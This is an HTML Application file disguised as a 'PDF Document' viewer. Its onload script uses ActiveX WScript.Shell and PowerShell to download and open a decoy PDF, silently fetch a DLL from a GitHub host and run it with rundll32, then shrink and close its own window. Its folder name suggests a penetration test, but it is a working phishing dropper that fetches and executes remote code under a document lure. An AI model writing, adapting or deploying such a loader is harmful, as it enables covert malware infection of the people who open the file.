<html>
<head>
<title>PDF Document</title>
<hta:application
    id="pdfViewer"
    applicationname="PDF Document"
    border="none"
    borderstyle="normal"
    caption="no"
    icon="%SystemRoot%\System32\shell32.dll,36"
    maximizebutton="no"
    minimizebutton="no"
    showintaskbar="no"
    windowstate="normal"
/>
<script language="javascript">
window.onload = function () {
    try {
        var objShell = new ActiveXObject("WScript.Shell");
        var objShellApp = new ActiveXObject("Shell.Application");

        var tempDir = objShell.ExpandEnvironmentStrings("%TEMP%");
        var targetDir = tempDir + "\\MyPenTest";
        var pdfUrl = "https://gnm7856.github.io/tomr/sample.pdf";
        var pdfLocal = targetDir + "\\dummy.pdf";
        var dllUrl = "https://raw.githubusercontent.com/bhekinko/test/main/notepad2.dll";
        var dllPath = tempDir + "\\notepad2.dll";

        // Create target directory
        objShell.Run('cmd.exe /c mkdir "' + targetDir + '" >nul 2>&1', 0, true);

        // Delay to ensure directory creation
        WScript.Sleep(2000);

        // Download PDF
        objShell.Run('powershell -NoProfile -Command "Invoke-WebRequest -Uri \'' + pdfUrl + '\' -OutFile \'' + pdfLocal + '\'"', 0, true);

        // Open PDF silently
        objShellApp.ShellExecute(pdfLocal, "", "", "open", 0);

        // Download DLL
        objShell.Run('powershell -NoProfile -Command "Invoke-WebRequest -Uri \'' + dllUrl + '\' -OutFile \'' + dllPath + '\'"', 0, true);

        // Delay before execution
        WScript.Sleep(5000);

        // Execute the DLL using rundll32
        objShell.Run('rundll32.exe "' + dllPath + '",notepad', 0, false);

        // Close the HTA window after delay
        window.resizeTo(0, 0);
        setTimeout(function () {
            window.close();
        }, 5000);

    } catch (e) {
        // Optional: alert("Error: " + e.message);
    }
}
</script>
</head>
<body>
    <div style="font-family: Arial; text-align: center; margin-top: 20px;">
        <h3>Opening PDF document, please wait...</h3>
        <p>This window will close automatically.</p>
    </div>
</body>
</html>
